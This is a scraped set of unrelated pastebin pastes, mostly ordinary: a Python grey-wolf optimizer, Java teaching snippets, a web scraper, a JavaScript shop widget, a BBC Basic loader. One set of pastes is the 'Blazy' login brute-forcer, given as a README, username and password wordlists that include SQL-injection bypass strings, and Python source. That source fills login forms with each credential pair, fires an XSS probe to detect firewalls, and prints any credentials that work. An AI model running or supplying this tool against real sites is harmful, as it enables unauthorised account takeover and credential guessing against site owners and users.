org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:99)\n\tat org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:118)\n\tat org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)\n\tat org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)\n\tat org.springframework.web.filter.FormContentFilter.doFilterInternal(FormContentFilter.java:92)\n\tat org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:118)\n\tat org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)\n\tat org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)\n\tat org.springframework.web.filter.HiddenHttpMethodFilter.doFilterInternal(HiddenHttpMethodFilter.java:93)\n\tat org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:118)\n\tat org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)\n\tat org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)\n\tat org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:200)\n\tat org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:118)\n\tat org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)\n\tat org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)\n\tat org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:202)\n\tat org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:96)\n\tat org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:490)\n\tat org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:139)\n\tat org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:92)\n\tat org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:74)\n\tat org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:343)\n\tat org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:408)\n\tat org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:66)\n\tat org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:853)\n\tat org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1587)\n\tat org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49)\n\tat java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)\n\tat java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624)\n\tat org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)\n\tat java.lang.Thread.run(Thread.java:748)\n""
}"
F4NMxWw0,lobos_lab10,andreerival,Python,Thursday 23rd of November 2023 10:35:26 PM CDT,"import random
import math
import matplotlib.pyplot as plt
import numpy as np
from tqdm import tqdm
import os
 
def easom_function(x):
    if len(x) != 2:
        raise(ValueError, ""Easom takes exactly two values"")
    return -math.cos(x[0]) * math.cos(x[1]) * math.exp(-(x[0] - math.pi)**2 - (x[1] - math.pi)**2)
 
def shubert_function(x):
    if len(x) != 2:
        raise(ValueError, ""Shubert takes exactly two values"")
    term1 = 0
    term2 = 0
    for i in range(1, 6):
        term1 += i * math.cos((i + 1) * x[0] + i)
        term2 += i * math.cos((i + 1) * x[1] + i)
    result = term1 * term2
    return result
 
def rosenbrock_function(x):
    add = 0
    for i in range(len(x)-1):
        add += 100 * (x[i + 1] - x[i]**2)**2 + (1 - x[i])**2
    return add
 
def lobo_gris(function, num_lobos, max_iterations, lower_bound, upper_bound, objective_minimum, dimensions, tolerancy):
    # Inicializar la manada de lobos
    manada = np.random.uniform(low=lower_bound, high=upper_bound, size=(num_lobos, dimensions))
    aptitudes = np.apply_along_axis(function, 1, manada)
    
    # Inicializar el mejor valor y la mejor posición
    best_aptitud = np.min(aptitudes)
    best_position = manada[np.argmin(aptitudes)]
    
    for iteracion in range(max_iterations):
        # Ordenar lobos por aptitud
        manada = manada[np.argsort(aptitudes)]
        
        # Encontrar los 3 mejores lobos
        x_alfa = manada[0] 
        x_beta = manada[1]
        x_delta = manada[2]
        
        a = 2 - iteracion * (2/max_iterations) # Actualizar parámetro a
        
        for i in range(num_lobos):
            # Actualizar posiciones 
            for d in range(dimensions):
                x_1 = x_alfa[d] + random.uniform(-a, a)
                x_2 = x_beta[d] + random.uniform(-a, a) 
                x_3 = x_delta[d] + random.uniform(-a, a)
                
                x_nuevo = (x_1 + x_2 + x_3)/3
                
                # Asegurarse de que la nueva posición esté dentro de los límites
                x_nuevo = max(min(x_nuevo, upper_bound), lower_bound)
                
                manada[i][d] = x_nuevo
            
            # Evaluar nuevas aptitudes
            aptitudes[i] = function(manada[i])
            
            # Verificar nuevo óptimo
            if aptitudes[i] < best_aptitud:
                best_aptitud = aptitudes[i]
                best_position = manada[i]
        
        # Revisar criterio de parada 
        if abs(best_aptitud - objective_minimum) <= tolerancy:
            return True, iteracion + 1, best_position, best_aptitud
    
    return False, max_iterations, best_position, best_aptitud


    
 
def mean(list):
    add = 0
    for elem in list:
        add += elem
    return add / len(list)
 
def std(lista):
    n = len(lista)
    if n < 2:
        return 0  # La desviación estándar no se puede calcular con menos de dos elementos
 
    media = sum(lista) / n
    suma_de_cuadrados = sum((x - media) ** 2 for x in lista)
    desviacion_estandar = (suma_de_cuadrados / (n - 1)) ** 0.5
    return desviacion_estandar
 
def printTable(database):
    print(""-"" * 38)
    print(f""| {'Función':^12} | {'WOLF':^19} |"")
    print(""-"" * 38)
 
    for funcion, datos in database:
        print(f""| {funcion:^12} | {datos:^19} |"")
    print(""-"" * 38)
 
functions = []
 
num_lobos = 200
max_iterations = 1000
epsilon = 1e-3
executions = 50

easom = {
    'name': 'easom',
    'function': easom_function,
    'objective_minimum': -1,
    'lower_bound': -math.pi,
    'upper_bound': math.pi,
    'dimensions': 2,
    'presition': epsilon
}
 
shubert = {
    'name': 'shubert',
    'function': shubert_function,
    'objective_minimum': -186.7309,
    'lower_bound': -10,
    'upper_bound': 10,
    'dimensions': 2,
    'presition': 1
}
 
rosenbrock = {
    'name': 'rosenbrock',
    'function': rosenbrock_function,
    'objective_minimum': 0,
    'lower_bound': 1, 
    'upper_bound': 1.5,
    'dimensions': 2,
    'presition': epsilon
}
 
functions.append(easom)
functions.append(shubert)
functions.append(rosenbrock)
 
print(""="" * 40)
print(""\t    Using..."")
print(f""\t{num_lobos} lobos"")
print(f""\t{max_iterations} iteraciones maximas"")
print(f""\t{executions} ejecuciones"")
print(f""\t{epsilon} de precision"")
print(""="" * 40)
results = []
 
# Crea un directorio para guardar las gráficas si no existe
output_directory = 'graphs'
os.makedirs(output_directory, exist_ok=True)
 
# To save the minimums
best_values = {
    'easom': float('inf'),
    'shubert': float('inf'),
    'rosenbrock': float('inf'),
}
 
for funct in functions:
    # Inicializa una lista para guardar las mejores posiciones de cada iteración
    best_positions_history = []

    # Crea una barra de progreso
    progress_bar = tqdm(total=executions, desc=funct['name'])

    # Contador de ejecuciones correctas
    correct_executions = 0
    iterations = []

    for execution in range(executions):
        achieved, iteration, best_position, best_value = lobo_gris(
            funct['function'], 
            num_lobos, 
            max_iterations, 
            funct['lower_bound'], 
            funct['upper_bound'], 
            funct['objective_minimum'], 
            funct['dimensions'], 
            funct['presition']
        )

        if achieved:
            correct_executions += 1
        if best_value < best_values[funct['name']]:
            best_values[funct['name']] = best_value
        iterations.append(iteration)
        progress_bar.update(1)

        # Guarda las mejores posiciones en cada iteración
        best_positions_history.append(best_position)

    # Cierra la barra de progreso
    progress_bar.close()

    # Anexamos resultados
    success_rate = (correct_executions * 100) / executions
    prom = mean(iterations)
    deviation = std(iterations)
    results.append((funct['name'], f""{int(prom)} ± {int(deviation)} ({success_rate}%)""))


    # Crea una gráfica para mostrar la evolución de la mejor posición para la función actual
    plt.figure()
    plt.xlabel('X')
    plt.ylabel('Y')
    plt.title(f'Evolución de la mejor posición para {funct[""name""]}')

    for i, best_position in enumerate(best_positions_history):
        x = best_position[0]  # Accede al valor x de la iteración actual
        y = best_position[1]  # Accede al valor y de la iteración actual
        plt.plot(x, y, '-o', label=f'Iteración {i + 1}', color='black', alpha=0.2)

    # Guarda la gráfica compuesta en un archivo PNG de alta calidad
    output_file = os.path.join(output_directory, f'{funct[""name""]}_evolution.png')
    plt.savefig(output_file, dpi=300, bbox_inches='tight')
    plt.close()

print("""")
printTable(results)
print(f""Best Easom Value: {best_values['easom']}"")
print(f""Best Shubert Value: {best_values['shubert']}"")
print(f""Best Rosenbrock Value: {best_values['rosenbrock']}"")
print(""\n\n"")"
YbAcn4fj,README,FlyFar,Email,Thursday 23rd of November 2023 10:17:41 PM CDT,"Blazy
Blazy is a modern login page bruteforcer.



Features
- Easy target selections
- Smart form and error detection
- CSRF and Clickjacking Scanner
- Cloudflare and WAF Detector
- 90% accurate results
- Checks for login bypass via SQL injection
- Multi-threading
- 100% accurate results
- Better form detection and compatibility

Requirements:
- Beautiful Soup
- Mechanize

Usages
Open your terminal and enter:
git clone https://github.com/UltimateHackers/Blazy

Now enter the following command:
cd Blazy

Lets install the required modules before running Blazy:
pip install -r requirements.txt

Now run Blazy by entering:
python blazy.py

Now enter your desired login page URL and Blazy will do its thing"
pvzgRFEr,usernames.txt,FlyFar,Email,Thursday 23rd of November 2023 10:15:37 PM CDT,"'or' '='
' or true--
root
admin
test
guest
info
adm
mysql
user
administrator
oracle
ftp"
DAZDA5b3,passwords.txt,FlyFar,Email,Thursday 23rd of November 2023 10:14:49 PM CDT,"'or' '='
' or true--
admin
123456
password
12345678
666666
111111
1234567
qwerty
siteadmin
administrator
root
123123
123321
1234567890
letmein123
test123
demo123
pass123
123qwe
qwe123
654321
loveyou
adminadmin123"
JLvcCY8F,blazy.py,FlyFar,Python,Thursday 23rd of November 2023 10:13:05 PM CDT,"#!/usr/bin/env python2
#Modules
import mechanize
import itertools
import cookielib
import sys
from bs4 import BeautifulSoup
from re import search, findall
from urllib import urlopen
from urllib2 import URLError
#Stuff related to Mechanize browser module
br = mechanize.Browser() #Shortening the call by assigning it to a varaible ""br""
# set cookies
cookies = cookielib.LWPCookieJar()
br.set_cookiejar(cookies)
# Mechanize settings
br.set_handle_equiv(True)
br.set_handle_redirect(True)
br.set_handle_referer(True)
br.set_handle_robots(False)
br.set_debug_http(False)
br.set_debug_responses(False)
br.set_debug_redirects(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time = 1)
br.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1'),
('Accept','text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'), ('Accept-Encoding','br')]
# Banner
print """"""\033[1;37m    ____   _                    
   |  _ \ | |              
   | |_) || |  __ _  ____ _   _ 
   |  _ < | | / _` ||_  /| | | |
   | |_) || || (_| | / / | |_| |
   |____/ |_| \__,_|/___| \__, |
                           __/ |
    Made with \033[91m<3\033[37m By D3V\033[1;37m   |___/ 
    \033[0m""""""
url = raw_input('\033[1;34m[?]\033[0m Enter target URL: ') #takes input from user
if 'http://' in url:
    pass
elif 'https://' in url:
    url = url.replace('https://', 'http://')
else:
    url = 'http://' + url
try:
    br.open(url, timeout=10.0) #Opens the url
except URLError as e:
    url = 'https://' + url
    br.open(url)
forms = br.forms() #Finds all the forms present in webpage

headers = str(urlopen(url).headers.headers).lower() #Fetches headers of webpage
if 'x-frame-options:' not in headers:
    print '\033[1;32m[+]\033[0m Heuristic found a Clickjacking Vulnerability'
if 'cloudflare-nginx' in headers:
    print '\033[1;31m[-]\033[0m Target is protected by Cloudflare'
data = br.open(url).read() #Reads the response
if 'type=""hidden""' not in data:
    print '\033[1;32m[+]\033[0m Heuristic found a CSRF Vulnerability'

soup =  BeautifulSoup(data, 'lxml') #Pareses the response with beuatiful soup
i_title = soup.find('title') #finds the title tag
if i_title != None:
    original = i_title.contents #value of title tag is assigned to 'original'

def WAF_detector(): #WAF detection function
    noise = ""?=<script>alert()</script>"" #a payload which is noisy enough to provoke the WAF
    fuzz = url + noise
    res1 = urlopen(fuzz) #Opens the noise injected payload
    if res1.code == 406 or res1.code == 501: #if the http response code is 406/501
        print""\033[1;31m[-]\033[1;m WAF Detected : Mod_Security""
    elif res1.code == 999: #if the http response code is 999
        print""\033[1;31m[-]\033[1;m WAF Detected : WebKnight""
    elif res1.code == 419: #if the http response code is 419
        print""\033[1;31m[-]\033[1;m WAF Detected : F5 BIG IP""
    elif res1.code == 403: #if the http response code is 403
        print ""\033[1;31m[-]\033[1;m Unknown WAF Detected""
WAF_detector()

def wordlist_u(lst): #Loads usernames from usernames.txt
    try:
        with open('usernames.txt','r') as f:
            for line in f:
                final = str(line.replace(""\n"",""""))
                lst.append(final)
    except IOError:
        print ""\033[1;31m[-]\033[1;m Wordlist not found!""
        quit()
def wordlist_p(lst): #Loads passwords from passwords.txt
    try:
        with open('passwords.txt','r') as f:
            for line in f:
                final = str(line.replace(""\n"",""""))
                lst.append(final)
    except IOError:
        print""\033[1;31m[-]\033[1;m Wordlist not found!""
        quit()
usernames = []
wordlist_u(usernames)
print '\033[1;97m[>]\033[1;m Usernames loaded: %i'% len(usernames)
passwords = []
wordlist_p(passwords)
print '\033[1;97m[>]\033[1;m Passwords loaded: %i'% + len(passwords)
def find(): #Function for finding forms
    form_number = 0
    for f in forms: #Finds all the forms in the webpage
        data = str(f) #Converts the response recieved to string
        username = search(r'<TextControl\([^<]*=\)>', data) #Searches for fields that accept plain text

        if username: #if such field is found
            username = (username.group().split('<TextControl(')[1][:-3]) #Extractst the name of field
            print '\033[1;33m[!]\033[0m Username field: ' + username #prints name of field
            passwd = search(r'<PasswordControl\([^<]*=\)>', data) #Searchs for fields that accept password like text

            if passwd: #if such field is found
                passwd = (passwd.group().split('<PasswordControl(')[1][:-3]) #Extracts the field name
                print '\033[1;33m[!]\033[0m Password field: ' + passwd #prints name of field
                select_n = search(r'SelectControl\([^<]*=', data) #checks for other selectable menus in form
 
                if select_n: #if a menu is found
                    name = (select_n.group().split('(')[1][:-1]) #Extracts the menu name
                    select_o = search(r'SelectControl\([^<]*=[^<]*\)>', data) #select_o is the name of menu

                    if select_o: #Proceeds to find options of menu
                        menu = ""True"" #Sets the menu to be true
                        options = (select_o.group().split('=')[1][:-1]) #Extracts options
                        print '\n\033[1;33m[!]\033[0m A drop down menu detected.'
                        print '\033[1;33m[!]\033[0m Menu name: ' + name #prints menu name
                        print '\033[1;33m[!]\033[0m Options available: ' + options #prints available options
                        option = raw_input('\033[1;34m[?]\033[0m Please Select an option:>> ') #Gets option from user
                        brute(username, passwd, menu, option, name, form_number) #Calls the bruteforce function
                    else:
                        menu = ""False"" #No menu is present in the form
                        try:
                            brute(username, passwd, menu, option, name, form_number) #Calls the bruteforce function
                        except Exception as e:
                            cannotUseBruteForce(username, e)
                            pass							
                else:
                    menu = ""False"" #No menu is present in the form
                    option = """" #Sets option to null
                    name = """" #Sets name to null
                    try:
                        brute(username, passwd, menu, option, name, form_number) #Calls the bruteforce function
                    except Exception as e:
                       cannotUseBruteForce(username, e)
                       pass
            else:
                form_number = form_number + 1
                pass
        else:
            form_number = form_number + 1
            pass
    print '\033[1;31m[-]\033[0m No forms found'
def cannotUseBruteForce(username, e):
    print '\r\033[1;31m[!]\033[0m Cannot use brute force with user %s.' % username
    print '\r    [Error: %s]' % e.message	
def brute(username, passwd, menu, option, name, form_number):
    for uname in usernames:
        progress = 1
        print '\033[1;97m[>]\033[1;m Bruteforcing username: %s'% uname
        for password in passwords:
            sys.stdout.write('\r\033[1;97m[>]\033[1;m Passwords tried: %i / %i'% (progress, len(passwords)))
            sys.stdout.flush()
            br.open(url)  
            br.select_form(nr=form_number)
            br.form[username] = uname
            br.form[passwd] = password
            if menu == ""False"":
                pass
            elif menu == ""True"":
                br.form[name] = [option]
            else:
                pass
            resp = br.submit()
            data = resp.read()
            data_low = data.lower()
            if 'username or password' in data_low:
                pass
            else:
                soup =  BeautifulSoup(data, 'lxml')
                i_title = soup.find('title')
                if i_title == None:
                    data = data.lower()
                    if 'logout' in data:
                        print '\n\033[1;32m[+]\033[0m Valid credentials found: '
                        print uname
                        print password
                        quit()
                    else:
                        pass
                else:
                    injected = i_title.contents
                    if original != injected:
                        print '\n\033[1;32m[+]\033[0m Valid credentials found: '
                        print '\033[1;32mUsername: \033[0m' + uname
                        print '\033[1;32mPassword: \033[0m' + password
                        quit()
                    else:
                        pass
            progress = progress + 1
        print ''
    print '\033[1;31m[-]\033[0m Failed to crack login credentials'
    quit()
find()"
a2tCZfRy,Untitled,kingbode,Python,Thursday 23rd of November 2023 10:01:12 PM CDT,"import requests
from bs4 import BeautifulSoup
import json


response = requests.get('https://www.bilbasen.dk/brugt/bil/mercedes/b200-d/20-aut-5d/5973808')

if response.status_code == 200:
    soup = BeautifulSoup(response.text, 'html.parser')

    data = soup.find_all('script')[-1].text.strip().replace('var _props = ', '').replace(';', '')

    jsonData = json.loads(data)['listing']['media']['images']
    for d in jsonData:
        print(d['url'])
else:
    print(f'Error fetching data from the website')
"
eLSvzMkL,shop_folder_select,valeraplusplus,JavaScript,Thursday 23rd of November 2023 08:48:04 PM CDT,"lpc_template.createCardsShop = {

	changeFolder: function( $self, folderId  ){

		$self.find('.block-id-folder').text(folderId).addClass('modified modified-text');

		lpc_template.createCardsShop.getProducts( $self[0] );
	},
	createSelect: function($self){
		/*parent wraper */
		let containerFolder = $self.find(`.lpc-select-folder-container`); // mainContainer


		let queryFolder = containerFolder.find(`.lpc-query-folder`); // Logic query
		let selectFolder = queryFolder.find('.lpc-query-folder__select');
		/*parent wraper */

		let folderInputSelected = queryFolder.find('.lpc-query-folder__input'); /* preview BTN */

		let folderId = queryFolder.attr('data-folder_id');

		let selectFolderBody = queryFolder.find('.lpc-query-folder__body'); /* option BOdy */

		let flagLoadFolder = 0;

		async function fetchAndCreateSelect() {
			try {
				// Создаем параметры запроса
				let params = new URLSearchParams();
				params.append('param[type]', 'shop2');
				params.append('param[depth]', '6');
	
				// Формируем URL для GET-запроса
				let url = '/my/s3/xapi/public/?method=folder/getTree&' + params.toString();
	
				// Отправляем GET-запрос с использованием fetch
				let response = await fetch(url, {
					method: 'GET',
					headers: {
						'Content-Type': 'application/json'
					}
				});
	
				if (!response.ok) {
					throw new Error('Ошибка при выполнении запроса');
				}
	
				let data = await response.json();
	
				if ( data.result.success ) {
					let items = data.result.items;
	
					// Нет категории магазина
					if( !items.length ){
						queryFolder.addClass('lpc-shop-not-found');
						return false;
					}

					items.shift(); // удаляет первую категорию
					// Создаем варианты (option) выпадающего списка и добавляем их к существующему select

					function createSelector(data) {
						var rootUL = document.createElement('ul');
						var levelObject = {};
						var parentLi = null;
					
						data.forEach(item => {
							var li = document.createElement('li');
							var div = document.createElement('div');
							div.className = 'lpc-query-folder__option lpc-query__option';
							div.setAttribute('data-folder_id', item.folder_id);
					
							var span = document.createElement('span');
							
							function decodeHtmlEntities(input) {
								var doc = new DOMParser().parseFromString(input, ""text/html"");
								return doc.documentElement.textContent;
							}
							span.textContent = decodeHtmlEntities( item.folder_name );
							div.title = decodeHtmlEntities( item.folder_name );

							var i = document.createElement('i');
							i.textContent = `(${item.items})`;
					
							div.appendChild(span);
							div.appendChild(i);
							li.appendChild(div);
					
							let level = Number(item._level);
					
							if (level == 1) {
								rootUL.appendChild(li);
								parentLi = li;
								levelObject = {};
							} else {
								if (!levelObject[level]) {
									levelObject[level] = document.createElement('ul');
									parentLi.appendChild(levelObject[level]);
								}
								levelObject[level].appendChild(li);
								parentLi = li;
							}
					
							if( folderId && folderId == item.folder_id ){
								folderInputSelected.find('span').text(
									$( div )
										.addClass('selected active')
										.find('span')
										.text()
								);
								//$( div ).addClass('active');
							}
						});
					
						return rootUL;
					}
					selectFolderBody.append( createSelector( items ) );

					return true;
				}
			} catch (error) {
				console.error('Ошибка при выполнении запроса:', error);
				return false;
			}
		}

		async function loadSelectedOption() {
			let awaitCreateSelect = await fetchAndCreateSelect(); // Ждем выполнения

			if( awaitCreateSelect ){
				queryFolder
				.removeClass('load')
				.addClass('loaded');

				folderInputSelected.on('click', function (e) {
					selectFolder.toggleClass(""open"");
				});
				let queryFolderOption = queryFolder.find('.lpc-query-folder__option'); /* option select */

				queryFolderOption.on('click', function (e) {
					let $this = $(this);
					let folderId = $this.data('folder_id');
					queryFolderOption.removeClass('active');
					$this
						.addClass('active')
						.siblings()
						.removeClass('active');
					folderInputSelected.find('span').text($this.find('span').text());
					selectFolder.toggleClass(""open"");

					lpc_template.createCardsShop.changeFolder( $self, folderId );

					if(!flagLoadFolder){
						queryFolder.addClass('folder-selected')
					}

				});
			}
		}
        
		loadSelectedOption();
	},
	watchLoadBlock: function (block) {
		var elem = '.lpc_lazy_load';


		let options = {
			rootMargin: '0px 0px 0px 0px'
		};
		let imageObserver = new IntersectionObserver((entries, imgObserver) => {
			entries.forEach((entry) => {
				if (entry.isIntersecting) {
					const lazyBox = entry.target // Текущий элемент

					if (lazyBox.tagName == 'IMG') {
						lazyBox.src = lazyBox.dataset.src // Адрес картинки data-src=""""
						lazyBox.classList.remove(elem); 
						imgObserver.unobserve(lazyBox);
						
					}if (lazyBox.dataset.func) { // Если элемент содержит data-func
						lpc_template.createCardsShop.getProducts(lazyBox); // Вызов функции
						lazyBox.classList.remove(elem);
						imgObserver.unobserve(lazyBox);
					} else {
						lazyBox.classList.remove(elem);
						imgObserver.unobserve(lazyBox);
					}
				}
			})
		}, options);

		var arr = document.querySelectorAll(elem);

		if(typeof block != 'undefined'){
			arr = block.querySelectorAll(elem);
		}
		arr.forEach((v) => {
			imageObserver.observe(v);
		});
	},
	flagStartScript: 0
};

lpc_template.queue.folderBlock = function($self) {
	
	let $blocks = $self.find('.lpc-folder-block');
	
	if ($blocks.length) {
		if( lpc_template.createCardsShop.flagStartScript == 0 ){
			lpc_template.createCardsShop.flagStartScript = 1;
			lpc_template.createCardsShop.watchLoadBlock();
		}
		
		$blocks.each(function () {
			let $block = $(this);

			if(s3LP.is_cms){
				
				lpc_template.createCardsShop.createSelect( $block.parent() );

				if( $self.is('div') ){
					lpc_template.createCardsShop.getProducts( $self );
				}
			}

		})
	}
}; "
Q1RgnX7Q,mas sobre interfaces,teslariu,Java,Thursday 23rd of November 2023 07:02:53 PM CDT,"/*
* Clases abstractas, concretas, polimorfismo, interfaces
*
*
*
*/


public class Cliente {
	
	String cuit;                               
	String direccion;
	float saldo;
	
	public void extraer(int monto) {
		if (saldo >= monto){
			saldo = saldo - monto
		}
	}
	
}


class ClientePyme extends Cliente {
	
	String razonSocial;
	float descubierto;
	
	public void extraer(int monto) {
		if (saldo + descubierto >= monto){
			saldo = saldo - monto
		}
}

abstract class Vehiculo{
	boolean conductor;
	boolean motor;
	
	abstract void mover();
	}


///////////////////////////////////////////////////

////  INTERFAZ UNICA

public interface Vehiculo(
	public float maxVel;
	public void arrancar();
	public void detener();
)

public class Auto implements Vehiculo(
	public void arrancar(){
			System.out.println(""Arrancando..."");
	}
	
	public void detener(){
			System.out.println(""Deteniendo..."");
	}
)

// Creo un auto
Vehiculo miAuto = new Auto();


//  polimorfismo
public class Camion implements Vehiculo(
	public void arrancar(){
			System.out.println(""Arrancando el camión..."");
	}
	
	public void detener(){
			System.out.println(""Deteniendo el camión..."");
	}
)

// Creo un camión
Vehiculo miCamion = new Camion();


//// INTERFACES MULTIPLES
public interface GPS{
	public String getCoordenadas();            
}

public interface Radio {                       
	public void encenderRadio();
	public void apagarRadio(); 
}

public class Smartphone implements GPS,Radio {
	public String getCoordenadas(){
			// return coordenadas;
	}
	
	public void encenderRadio(){
			System.out.println(""Encendiendo radio..."");
	}
	
	public void apagarRadio(){
			System.out.println(""Apagando radio..."");
	}

}


/// Clase final: es una clase QUE NO PUEDE SER EXTENDIDA (no se puede heredar,no puede tener subclases)

final class Persona{
	
	String Nombre;
	String Apellido;
	int DNI;
	
	/// getters y setters
	// puedo declarar algun metodo final
	final void mostrar(){
			System.out.println(""No tengo hereredos..."");
		}
	}

// Un atributo de Clase tambien llamados ESTATICOS: pertenece a TODA LA CLASE
// y no a un objeto en particular; son estaticos (constantes)

clase Perro:
a. metodos: correr, jugar, caminar, saltar, etc
b. atributos: raza, especie = ""Canis familiaris""

/// Mas sobre interfaces

//// INTERFACES MULTIPLES con igual firma
public interface GPS{
	public String getCoordenadas();            
}

public interface Radio {                       
	public void encender();
	public void apagar();
	public void siguiente(){
		// proxima radio
	}
}

public interface ReproductorMusica {                       
	public void encender();
	public void apagar();
	public void siguiente(){
		// proxima cancion
	}
}


public class Smartphone implements GPS,Radio,ReproductorMusica {
	public String getCoordenadas(){
			// return coordenadas;
	}
	
	// aca irian los metodos
	public void siguiente(){
		Reproductor.super.siguiente(); // llamo el metodo en reproductor musica
	}
}


// llamada:
Smartphone moto = new Smartphone();
moto.siguiente();    // reproduce siguiente cancion en el reproductor de musica

// herencia de interfaz
 public interface A{
	 }
 
 public interface B extends A{
	 }


"
jitia0H5,Ejemplo de interaccion entre clases,teslariu,Java,Thursday 23rd of November 2023 06:51:55 PM CDT,"/*
 * Problema: un cliente interactua con una caja de ahorro y deposita
 * $100000, ingresando su clave para  realizar el depósito
 * 
 * 
 */


public class Principal {
	
	class CajaDeAhorro{
		
		private float saldo;
		
		public void depositar(float monto){
			saldo = saldo + monto;
		}
		
		public void setSaldo(float s){
			saldo = s;
		}
		
		public float getSaldo(){
			return saldo;
		}
		
		// Constructor
		CajaDeAhorro(float s){
				saldo = s;
		}
		
	}
	
	class Cliente{
	
		private int DNI;
		private String Clave;
		private CajaDeAhorro Cuenta;
		
		// Constructor
		Cliente(int d, String c, CajaDeAhorro cda){
				DNI = d;
				Clave = c;
				Cuenta = cda;
		}
		
		// metodos
		public CajaDeAhorro getCajaDeAhorro(){
			return Cuenta;
		}
		
		// getters y setters de DNI y Clave
		//  ........
	
	
	
	}
	
	public static void main (String[] args) {
		
		// Construimos una instancia de caja de ahorro con $50.000
		CajaDeAhorro c1 = new CajaDeAhorro(50000)
		
		// Construyo el cliente
		Cliente cliente = new Cliente(38555122,""clave"",c1)
		
		// deposito el dinero
		cliente.Cuenta.depositar(100000)
		
		// verifico el saldo:
		System.out.println(""Saldo: "" + cliente.Cuenta.getSaldo())
		
	}
}

"
fhEKCHNi,Day 14 try catch finally,HarrJ,Java,Thursday 23rd of November 2023 06:39:42 PM CDT,"import java.util.Scanner;

public class Day14A {
    public static void main(String[] args) {
        Scanner sc = new Scanner(System.in);
        double num1, num2;
        String storeValue, opr;
        try {
            System.out.print(""Enter 1st value: "");
            storeValue = sc.nextLine();
            num1 = Double.parseDouble(storeValue);
            System.out.print(""Enter math operation(+ - * /): "");
            opr = sc.nextLine();
            System.out.print(""Enter 2nd value: "");
            storeValue = sc.nextLine();
            num2 = Double.parseDouble(storeValue);
            
            compute(num1, num2, opr);
        } catch (Exception e) {
            System.out.println(""Error on the user typed value"");
        } finally {
            System.out.println(""code complete"");
        }
    }
    
    // modified code from Day10A and Day12F file
    static void compute(double n1, double n2, String op){
        boolean computeSuccess = true;
        String printout ="""";
        double result = 0;
        switch (op) {
            case ""+"":
                result = n1 + n2;
                break;
            case ""-"":
                result = n1 - n2;
                break;
            case ""*"":
                result = n1 * n2;
                break;
            case ""/"":
                try {
                    result = n1 / n2;
                } catch (Exception e) {
                    printout = ""Cannot divide by zero"";
                    computeSuccess = false;
                }
                break;
            default:
                printout = ""Operator not on list"";
                computeSuccess = false;
        }
        if (computeSuccess) {
            printout = String.format(""%.2f %s %.2f = %.4f""
                , n1, op, n2, result);
        }
        System.out.println(printout);
    }
}"
imJfUZ6y,Agon Light2 Load Screen,lovejoy777,ZXBasic,Thursday 23rd of November 2023 06:39:31 PM CDT,"   10 REM BBC Basic header file
   20 REM Written by Steve Lovejoy aka Lovejoy777
   30 REM Icon design by Arnold Meszaros (netangel)
   100 :
   101 REM Initialization, getting system vars, setting others
   102 REM MODE 0  = 80x60, 16 colours.
   103 REM MODE 1  = 80x60, 4 colours.
   104 REM MODE 2  = 80x60, 2 colours.
   105 REM MODE 3  = 80x30, 64 colours.
   106 REM MODE 4  = 80x30, 16 colours.
   107 REM MODE 7  = 40x25, 16 colours orig bbcmicro.
   108 REM MODE 8  = 40x30, 64 colours.
   109 REM MODE 12 = 40X25, 64 colours.
   110 M% = 8: REM Screen mode
   120 BG% = 140: REM Background color (blue)
   130 FG%= 15: REM Foreground color (white)
   140 MODE M%: COLOUR BG%: COLOUR FG%: CLS
   150 W%=FN_GETBYTE_VDP(&13): REM Screen width in chars
   160 H%=FN_GETBYTE_VDP(&14): REM Screen height in chars
   170 C%=FN_GETBYTE_VDP(&15): REM Number of colours
   180 F%=48000: REM Free BASIC bytes
   200 :
   201 REM Agon Light ""Sitting Kung Fu man"" logo chars
   210 VDU 23,200,7,15,31,31,31,31,31,63
   220 VDU 23,201,192,224,240,240,240,240,240,248
   230 VDU 23,202,63,63,31,15,15,15,7,7
   240 VDU 23,203,248,248,240,224,224,224,192,192
   250 VDU 23,204,0,1,7,15,31,63,127,127
   260 VDU 23,205,7,199,199,195,227,225,240,240
   270 VDU 23,206,192,195,195,135,135,15,15,31
   280 VDU 23,207,0,0,224,240,248,252,252,254
   290 VDU 23,208,0,0,1,1,3,3,7,7
   300 VDU 23,209,255,255,255,255,255,255,255,255
   310 VDU 23,210,248,248,248,240,224,225,193,195
